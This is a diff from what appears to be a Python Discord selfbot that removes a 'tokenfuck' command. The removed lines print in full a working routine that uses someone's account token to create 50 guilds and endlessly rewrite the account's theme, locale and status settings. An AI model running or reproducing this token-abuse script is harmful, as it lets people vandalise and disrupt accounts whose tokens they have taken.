@@ -368,61 +368,7 @@ async def ipinfo(ctx, *, ipaddr: str = '1.3.3.7'): # b'\xfc'
         if field['value']:
             em.add_field(name=field['name'], value=field['value'], inline=True)
     return await ctx.send(embed=em)
-#------------------------------------------------------------------------------------------------------------------------------------#
-@bot.command(aliases=['tokenfucker', 'disable', 'crash']) 
-async def tokenfuck(ctx, _token): # b'\xfc' 
-    await ctx.message.delete()
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
-        'Content-Type': 'application/json',
-        'Authorization': _token,
-    }
-    request = requests.Session()
-    payload = {
-        'theme': "light",
-        'locale': "ja",
-        'message_display_compact': False,
-        'inline_embed_media': False,
-        'inline_attachment_media': False,
-        'gif_auto_play': False,
-        'render_embeds': False,
-        'render_reactions': False,
-        'animate_emoji': False,
-        'convert_emoticons': False,
-        'enable_tts_command': False,
-        'explicit_content_filter': '0',
-        'status': "invisible"
-    }
-    guild = {
-        'channels': None,
-        'icon': None,
-        'name': "Neox",
-        'region': "brazil"
-    } 
-    for _i in range(50):
-        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
-    while True:
-        try:
-            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
-        except Exception as e:
-            print(f"{Color.RED}[ERROR]: {Color.YELLOW}{e}"+Color.RESET)
-        else:
-            break
-    modes = cycle(["light", "dark"])
-    statuses = cycle(["online", "idle", "dnd", "invisible"])
-    while True:
-        setting = {
-            'theme': next(modes),
-            'locale': random.choice(locales),
-            'status': next(statuses)
-        }
-        while True:
-            try:
-                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
-            except Exception as e:
-                print(f"{Color.RED}[ERROR]: {Color.YELLOW}{e}"+Color.RESET)
-            else:
-                break   
+
 #------------------------------------------------------------------------------------------------------------------------------------#
 @bot.command()
 async def abc(ctx): # b'\xfc'
